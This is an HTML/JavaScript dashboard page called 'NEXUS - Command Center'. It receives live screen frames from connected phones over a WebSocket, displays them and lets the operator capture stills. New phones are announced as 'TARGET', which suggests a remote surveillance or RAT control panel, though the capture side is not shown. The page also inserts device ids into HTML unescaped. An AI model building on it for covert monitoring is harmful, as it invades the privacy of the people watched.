<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS - Command Center</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;400;700&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --neon-blue: #00f0ff;
            --neon-green: #00ff88;
            --neon-red: #ff0044;
            --neon-purple: #7b2fff;
            --neon-orange: #ff6600;
            --dark-bg: #05050f;
            --glass: rgba(255,255,255,0.03);
            --glass-border: rgba(255,255,255,0.08);
            --panel-bg: rgba(10,10,30,0.92);
        }

        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
            background: var(--dark-bg);
            color: #fff;
            font-family: 'JetBrains Mono', monospace;
            user-select: none;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: 
                radial-gradient(circle at 20% 50%, rgba(0,240,255,0.04) 0%, transparent 50%),
                radial-gradient(circle at 80% 50%, rgba(123,47,255,0.04) 0%, transparent 50%);
            z-index: 0;
            pointer-events: none;
        }

        /* ─── الحاوية الرئيسية ─── */
        .app {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            display: flex;
            flex-direction: row;
            z-index: 1;
            background: var(--dark-bg);
        }

        /* ─── الشريط الجانبي الأيسر (أجهزة) ─── */
        .sidebar-left {
            width: 65px;
            background: var(--panel-bg);
            border-right: 1px solid var(--glass-border);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 8px 0;
            z-index: 10;
            flex-shrink: 0;
            overflow: hidden;
            transition: width 0.25s;
        }
        .sidebar-left:hover {
            width: 200px;
        }
        .sidebar-left .logo {
            font-family: 'Orbitron', sans-serif;
            font-size: 11px;
            color: var(--neon-blue);
            letter-spacing: 2px;
            padding: 10px 0;
            border-bottom: 1px solid rgba(0,240,255,0.15);
            width: 100%;
            text-align: center;
            flex-shrink: 0;
            white-space: nowrap;
        }
        .sidebar-left .logo span { display: inline-block; }
        .sidebar-left:hover .logo span::before { content: '⟨ '; }
        .sidebar-left:hover .logo span::after { content: ' ⟩'; }
        
        .sidebar-left .device-scroll {
            flex: 1;
            overflow-y: auto;
            width: 100%;
            padding: 5px 0;
        }
        .sidebar-left .device-scroll::-webkit-scrollbar { width: 0; }
        
        .device-btn {
            width: 100%;
            padding: 8px 5px;
            background: transparent;
            border: none;
            border-left: 2px solid transparent;
            color: #666;
            cursor: pointer;
            transition: all 0.2s;
            text-align: center;
            font-family: 'JetBrains Mono', monospace;
            font-size: 10px;
            position: relative;
            white-space: nowrap;
            overflow: hidden;
        }
        .device-btn .icon { font-size: 16px; display: block; margin-bottom: 2px; }
        .device-btn .label { display: none; }
        .sidebar-left:hover .device-btn .label { display: inline; }
        .sidebar-left:hover .device-btn { padding: 6px 15px; text-align: left; }
        .sidebar-left:hover .device-btn .icon { display: inline; margin-bottom: 0; margin-right: 6px; }
        
        .device-btn:hover { background: rgba(255,255,255,0.05); color: #aaa; }
        .device-btn.active { 
            border-left-color: var(--neon-green);
            color: var(--neon-green);
            background: rgba(0,255,136,0.05);
        }
        .device-btn .dot {
            width: 5px; height: 5px;
            border-radius: 50%;
            display: inline-block;
            position: absolute;
            top: 5px;
            right: 5px;
        }
        .sidebar-left:hover .device-btn .dot {
            position: relative;
            top: auto;
            right: auto;
            margin-left: 4px;
        }
        .device-btn .dot.online { background: var(--neon-green); box-shadow: 0 0 6px var(--neon-green); }
        .device-btn .dot.offline { background: var(--neon-red); }

        /* ─── منطقة الشاشة المركزية ─── */
        .screen-area {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            background: #000;
            overflow: hidden;
            min-width: 0;
        }

        /* ─── الكانفاس (يملأ المساحة بالكامل) ─── */
        #screenCanvas {
            display: block;
            width: 100%;
            height: 100%;
            object-fit: contain;
            position: absolute;
            top: 0;
            left: 0;
        }

        /* ─── شاشة الانتظار ─── */
        .placeholder {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: #222;
            z-index: 2;
            pointer-events: none;
        }
        .placeholder .icon { font-size: 80px; opacity: 0.3; }
        .placeholder h3 { font-size: 14px; color: #333; font-weight: 400; margin-top: 10px; }
        .placeholder h3 .highlight { color: var(--neon-blue); opacity: 0.5; }

        /* ─── طبقة التحكم العلوية (شفافة، تظهر عند التحريك) ─── */
        .overlay-top {
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 45px;
            background: linear-gradient(180deg, rgba(0,0,0,0.7) 0%, transparent 100%);
            display: flex;
            align-items: center;
            padding: 0 15px;
            opacity: 0;
            transition: opacity 0.3s;
            z-index: 5;
            pointer-events: none;
        }
        .screen-area:hover .overlay-top { opacity: 1; pointer-events: auto; }
        
        .overlay-top .stat {
            font-size: 10px;
            color: rgba(255,255,255,0.5);
            margin-right: 15px;
            font-family: 'JetBrains Mono', monospace;
        }
        .overlay-top .stat .val { color: var(--neon-blue); font-weight: 700; }
        .overlay-top .spacer { flex: 1; }
        .overlay-top .device-name {
            font-size: 11px;
            color: rgba(255,255,255,0.6);
            font-family: 'Orbitron', sans-serif;
        }

        /* ─── الشريط الجانبي الأيمن (أزرار التحكم) ─── */
        .sidebar-right {
            width: 55px;
            background: var(--panel-bg);
            border-left: 1px solid var(--glass-border);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 5px 0;
            z-index: 10;
            flex-shrink: 0;
        }
        
        .ctrl-btn {
            width: 40px;
            height: 40px;
            margin: 3px 0;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 8px;
            color: #666;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            position: relative;
        }
        .ctrl-btn:hover { 
            background: rgba(255,255,255,0.08); 
            color: #fff;
            border-color: rgba(255,255,255,0.15);
        }
        .ctrl-btn.active {
            border-color: var(--neon-red);
            color: var(--neon-red);
            background: rgba(255,0,68,0.1);
            box-shadow: 0 0 15px rgba(255,0,68,0.05);
        }
        .ctrl-btn.primary {
            border-color: rgba(0,240,255,0.2);
            color: var(--neon-blue);
        }
        .ctrl-btn.primary:hover {
            background: rgba(0,240,255,0.1);
            box-shadow: 0 0 20px rgba(0,240,255,0.05);
        }
        .ctrl-btn.danger {
            border-color: rgba(255,0,68,0.15);
        }
        .ctrl-btn.danger.active {
            border-color: var(--neon-red);
            background: rgba(255,0,68,0.15);
            box-shadow: 0 0 15px rgba(255,0,68,0.1);
        }
        
        .ctrl-btn .tooltip {
            position: absolute;
            right: 50px;
            top: 50%;
            transform: translateY(-50%);
            background: rgba(0,0,0,0.9);
            color: #fff;
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 10px;
            font-family: 'JetBrains Mono', monospace;
            white-space: nowrap;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.2s;
            border: 1px solid var(--glass-border);
        }
        .ctrl-btn:hover .tooltip { opacity: 1; }

        .sidebar-right .spacer { flex: 1; }
        
        .sidebar-right .fps-indicator {
            font-size: 9px;
            color: #444;
            text-align: center;
            padding: 5px;
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 1px;
        }
        .sidebar-right .fps-indicator .num { 
            color: var(--neon-blue); 
            font-size: 14px;
            display: block;
            font-family: 'JetBrains Mono', monospace;
        }

        /* ─── وضع ملء الشاشة ─── */
        .screen-area:-webkit-full-screen {
            width: 100vw !important;
            height: 100vh !important;
        }
        .screen-area:-moz-full-screen {
            width: 100vw !important;
            height: 100vh !important;
        }
        .screen-area:fullscreen {
            width: 100vw !important;
            height: 100vh !important;
        }
        .screen-area:-webkit-full-screen #screenCanvas {
            width: 100vw !important;
            height: 100vh !important;
        }
        .screen-area:-moz-full-screen #screenCanvas {
            width: 100vw !important;
            height: 100vh !important;
        }
        .screen-area:fullscreen #screenCanvas {
            width: 100vw !important;
            height: 100vh !important;
        }

        /* ─── Toast ─── */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            padding: 8px 20px;
            background: rgba(0,240,255,0.08);
            border: 1px solid rgba(0,240,255,0.2);
            border-radius: 6px;
            font-size: 11px;
            color: var(--neon-blue);
            display: none;
            z-index: 9999;
            font-family: 'JetBrains Mono', monospace;
            backdrop-filter: blur(20px);
            animation: fadeInUp 0.3s ease;
        }
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateX(-50%) translateY(10px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        /* ─── استجابة للشاشات الصغيرة ─── */
        @media (max-width: 600px) {
            .sidebar-left { width: 40px; }
            .sidebar-left:hover { width: 150px; }
            .sidebar-right { width: 40px; }
            .ctrl-btn { width: 30px; height: 30px; font-size: 12px; }
            .device-btn { font-size: 8px; }
            .device-btn .icon { font-size: 12px; }
            .overlay-top .stat { font-size: 8px; margin-right: 8px; }
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- ─── الشريط الجانبي الأيسر: الأجهزة ─── -->
        <div class="sidebar-left" id="sidebarLeft">
            <div class="logo"><span>NEXUS</span></div>
            <div class="device-scroll" id="deviceList">
                <button class="device-btn active" onclick="selectDevice('all')" data-id="all">
                    <span class="icon">🌐</span>
                    <span class="label">ALL</span>
                    <span class="dot" style="background:var(--neon-blue)"></span>
                </button>
            </div>
        </div>

        <!-- ─── منطقة الشاشة المركزية ─── -->
        <div class="screen-area" id="screenArea">
            <div class="placeholder" id="placeholder">
                <div class="icon">📡</div>
                <h3>WAITING FOR <span class="highlight">SIGNAL</span></h3>
            </div>
            <canvas id="screenCanvas"></canvas>
            
            <!-- طبقة المعلومات العلوية -->
            <div class="overlay-top">
                <span class="stat">FPS: <span class="val" id="fpsTop">0</span></span>
                <span class="stat">LAT: <span class="val" id="latTop">0ms</span></span>
                <span class="stat">FRAMES: <span class="val" id="framesTop">0</span></span>
                <div class="spacer"></div>
                <span class="device-name" id="deviceNameTop">ALL DEVICES</span>
            </div>
        </div>

        <!-- ─── الشريط الجانبي الأيمن: الأزرار ─── -->
        <div class="sidebar-right">
            <button class="ctrl-btn danger active" onclick="toggleStream()" id="streamBtn">
                ⏹
                <span class="tooltip">TOGGLE STREAM</span>
            </button>
            <button class="ctrl-btn" onclick="clearScreen()">
                ✕
                <span class="tooltip">CLEAR</span>
            </button>
            <button class="ctrl-btn primary" onclick="toggleFullscreen()">
                ⛶
                <span class="tooltip">FULLSCREEN</span>
            </button>
            <button class="ctrl-btn" onclick="captureStill()">
                📷
                <span class="tooltip">CAPTURE</span>
            </button>
            <div class="spacer"></div>
            <div class="fps-indicator">
                <span class="num" id="fpsSide">0</span>
                FPS
            </div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        // ─── التهيئة ───
        const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
        const WS_URL = `${protocol}//${location.host}`;
        
        let ws = null;
        let selectedDevice = 'all';
        let streamActive = true;
        let frameCount = 0;
        let lastFrameTime = Date.now();
        let fpsValues = [];
        let devices = {};
        let isFullscreen = false;
        
        const canvas = document.getElementById('screenCanvas');
        const ctx = canvas.getContext('2d');
        
        // ─── بدء التشغيل ───
        connect();
        
        // ─── WebSocket ───
        function connect() {
            if (ws && ws.readyState === WebSocket.OPEN) return;
            
            ws = new WebSocket(`${WS_URL}?type=viewer&viewer=${Math.random().toString(36).substring(7)}`);
            
            ws.onopen = () => { 
                updateConnection(true); 
                showToast('🟢 SYSTEM ONLINE');
            };
            
            ws.onmessage = (event) => { 
                try { 
                    handleMessage(JSON.parse(event.data)); 
                } catch(e) {} 
            };
            
            ws.onclose = () => { 
                updateConnection(false);
                setTimeout(connect, 3000); 
            };
            
            ws.onerror = () => {};
        }

        function handleMessage(data) {
            switch(data.type) {
                case 'device_list':
                    devices = {};
                    data.devices.forEach(d => { devices[d.id] = { id: d.id, online: true }; });
                    renderDevices();
                    break;
                case 'device_online':
                    devices[data.deviceId] = { id: data.deviceId, online: true };
                    renderDevices();
                    showToast(`📱 TARGET: ${data.deviceId.substring(0,4).toUpperCase()}`);
                    break;
                case 'device_offline':
                    if (devices[data.deviceId]) devices[data.deviceId].online = false;
                    renderDevices();
                    break;
                case 'frame':
                    if ((selectedDevice === 'all' || selectedDevice === data.deviceId) && streamActive) {
                        renderFrame(data.image);
                        updateStats();
                    }
                    break;
            }
        }

        function renderFrame(base64Image) {
            const img = new Image();
            img.onload = () => {
                // ضبط الكانفاس ليملأ المساحة
                const container = document.getElementById('screenArea');
                const rect = container.getBoundingClientRect();
                
                canvas.width = img.width;
                canvas.height = img.height;
                canvas.style.width = '100%';
                canvas.style.height = '100%';
                
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                document.getElementById('placeholder').style.display = 'none';
                frameCount++;
                document.getElementById('framesTop').textContent = frameCount;
            };
            img.src = 'data:image/jpeg;base64,' + base64Image;
        }

        function updateStats() {
            const now = Date.now();
            const elapsed = now - lastFrameTime;
            lastFrameTime = now;
            
            const fps = Math.round(1000 / Math.max(elapsed, 1));
            fpsValues.push(fps);
            if (fpsValues.length > 15) fpsValues.shift();
            
            const avgFps = Math.round(fpsValues.reduce((a,b)=>a+b, 0) / fpsValues.length);
            document.getElementById('fpsTop').textContent = avgFps;
            document.getElementById('fpsSide').textContent = avgFps;
            document.getElementById('latTop').textContent = elapsed + 'ms';
        }

        function renderDevices() {
            const list = document.getElementById('deviceList');
            const ids = Object.keys(devices);
            
            let html = `<button class="device-btn ${selectedDevice === 'all' ? 'active' : ''}" onclick="selectDevice('all')" data-id="all">
                <span class="icon">🌐</span>
                <span class="label">ALL</span>
                <span class="dot" style="background:var(--neon-blue)"></span>
            </button>`;
            
            ids.forEach(id => {
                const d = devices[id];
                html += `<button class="device-btn ${selectedDevice === id ? 'active' : ''}" onclick="selectDevice('${id}')" data-id="${id}">
                    <span class="icon">📱</span>
                    <span class="label">${id.substring(0,4).toUpperCase()}</span>
                    <span class="dot ${d.online ? 'online' : 'offline'}"></span>
                </button>`;
            });
            
            list.innerHTML = html;
        }

        function selectDevice(id) {
            selectedDevice = id;
            document.querySelectorAll('.device-btn').forEach(el => {
                el.classList.toggle('active', el.dataset.id === id);
            });
            document.getElementById('deviceNameTop').textContent = id === 'all' ? 'ALL DEVICES' : id.substring(0,4).toUpperCase();
            clearScreen();
        }

        function toggleStream() {
            streamActive = !streamActive;
            const btn = document.getElementById('streamBtn');
            if (streamActive) {
                btn.textContent = '⏹';
                btn.className = 'ctrl-btn danger active';
                showToast('▶ STREAM ACTIVE');
            } else {
                btn.textContent = '▶';
                btn.className = 'ctrl-btn primary';
                showToast('⏹ STREAM PAUSED');
            }
        }

        function clearScreen() {
            canvas.style.width = '0';
            canvas.style.height = '0';
            document.getElementById('placeholder').style.display = 'block';
            frameCount = 0;
            document.getElementById('framesTop').textContent = '0';
        }

        function toggleFullscreen() {
            const container = document.getElementById('screenArea');
            if (!document.fullscreenElement) {
                if (container.requestFullscreen) {
                    container.requestFullscreen();
                } else if (container.webkitRequestFullscreen) {
                    container.webkitRequestFullscreen();
                } else if (container.msRequestFullscreen) {
                    container.msRequestFullscreen();
                }
                isFullscreen = true;
            } else {
                if (document.exitFullscreen) {
                    document.exitFullscreen();
                } else if (document.webkitExitFullscreen) {
                    document.webkitExitFullscreen();
                } else if (document.msExitFullscreen) {
                    document.msExitFullscreen();
                }
                isFullscreen = false;
            }
        }

        function captureStill() {
            if (!canvas.width || !canvas.height) {
                showToast('⚠ NO FRAME AVAILABLE');
                return;
            }
            const link = document.createElement('a');
            link.download = `nexus_${Date.now()}.jpg`;
            link.href = canvas.toDataURL('image/jpeg', 0.9);
            link.click();
            showToast('📸 FRAME CAPTURED');
        }

        function updateConnection(online) {
            const indicator = document.querySelector('.fps-indicator .num');
            if (!online) {
                indicator.style.color = 'var(--neon-red)';
                document.getElementById('fpsTop').textContent = '--';
                document.getElementById('fpsSide').textContent = '--';
            } else {
                indicator.style.color = 'var(--neon-blue)';
            }
        }

        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.style.display = 'block';
            clearTimeout(toast._timeout);
            toast._timeout = setTimeout(() => { toast.style.display = 'none'; }, 2500);
        }
    </script>
</body>
</html>
